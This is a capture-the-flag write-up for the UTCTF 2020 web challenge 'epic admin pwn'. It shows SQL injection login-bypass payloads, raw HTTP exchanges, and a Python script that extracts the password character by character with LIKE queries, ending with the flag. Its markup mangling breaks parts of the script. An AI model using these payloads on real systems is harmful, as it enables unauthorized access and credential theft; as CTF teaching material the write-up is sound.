<h1>UTCTF 2020 â€“ epic admin pwn</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 50</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>this challenge is epic i promise</p>
  
  <p>the flag is the password</p>
  
  <p>http://web2.utctf.live:5006/</p>
  
  <p>by matt</p>
</blockquote>

<h2>Solution</h2>

<p>The web site is basically a login form vulnerable to SQL injection. A simple payload like <code>' or '1'='1</code> can be used to discover this.</p>

<p>```
POST / HTTP/1.1
Host: web2.utctf.live:5006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://web2.utctf.live:5006
Connection: close
Referer: http://web2.utctf.live:5006/
Upgrade-Insecure-Requests: 1</p>

<p>username=admin&amp;pass=%27+or+%271%27%3D%271</p>

<p>HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 19:10:08 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 2496
Connection: Close</p>

<p><!DOCTYPE html>
<html lang="en">
<head>
    <title>how shot web</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================--> <br />
    <link rel="icon" type="image/png" href="static/images/icons/favicon.ico"/>
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/animate/animate.css">
<!--===============================================================================================--> <br />
    <link rel="stylesheet" type="text/css" href="static/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/select2/select2.min.css">
<!--===============================================================================================--> <br />
    <link rel="stylesheet" type="text/css" href="static/vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/css/util.css">
    <link rel="stylesheet" type="text/css" href="static/css/main.css">
<!--===============================================================================================-->
</head>
<body></p>

<pre><code>&lt;div class="limiter"&gt;
    &lt;div class="container-login100"&gt;
        &lt;span class="login100-form-title p-b-43"&gt;
            Welcome, admin!
        &lt;/span&gt;

    &lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
</code></pre>

<p></html>
```</p>

<p>Considering that the password is the flag, you can use SQL <code>LIKE</code> clause to discover each character one at a time.</p>

<p>```
POST / HTTP/1.1
Host: web2.utctf.live:5006
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://web2.utctf.live:5006
Connection: close
Referer: http://web2.utctf.live:5006/
Upgrade-Insecure-Requests: 1</p>

<p>username=admin&amp;pass=%27+or+password+like+%27u%25</p>

<p>HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 07 Mar 2020 19:18:38 GMT
Server: Werkzeug/1.0.0 Python/3.8.1
Content-Length: 2496
Connection: Close</p>

<p><!DOCTYPE html>
<html lang="en">
<head>
    <title>how shot web</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================--> <br />
    <link rel="icon" type="image/png" href="static/images/icons/favicon.ico"/>
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/animate/animate.css">
<!--===============================================================================================--> <br />
    <link rel="stylesheet" type="text/css" href="static/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/vendor/select2/select2.min.css">
<!--===============================================================================================--> <br />
    <link rel="stylesheet" type="text/css" href="static/vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
    <link rel="stylesheet" type="text/css" href="static/css/util.css">
    <link rel="stylesheet" type="text/css" href="static/css/main.css">
<!--===============================================================================================-->
</head>
<body></p>

<pre><code>&lt;div class="limiter"&gt;
    &lt;div class="container-login100"&gt;
        &lt;span class="login100-form-title p-b-43"&gt;
            Welcome, admin!
        &lt;/span&gt;

    &lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
</code></pre>

<p></html>
```</p>

<p>This can be automated with a simple <a href="epic-admin-pwn.py">Python script</a>.</p>

<p>```python
import requests
import string</p>

<p>url<em>form = "http://web2.utctf.live:5006/"
payload = "username=admin&amp;pass=' or password like '{}%"
possible</em>chars = list("{}" + string.digits + string.ascii<em>lowercase + string.ascii</em>uppercase)
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded"
}</p>

<p>found<em>chars = ""
while True:
    for new</em>char in possible<em>chars:
        attempt = found</em>chars + new<em>char
        print("[*] Attempt: '{}'.".format(attempt))
        data = payload.format(attempt)
        print("[*] Payload: {}.".format(data))
        page = requests.post(url</em>form, data=data, headers=headers)</p>

<pre><code>    if "Welcome" in page.text:
        found_chars += new_char
        print("[*] Found chars: '{}'".format(found_chars))
        break

if found_chars[-1] == "}":
    break
</code></pre>

<p>print("The FLAG is: {}".format(found_chars))
```</p>

<p>The script will discover the flag.</p>

<p><code>
utflag{dual1pa1sp3rf3ct}
</code></p>
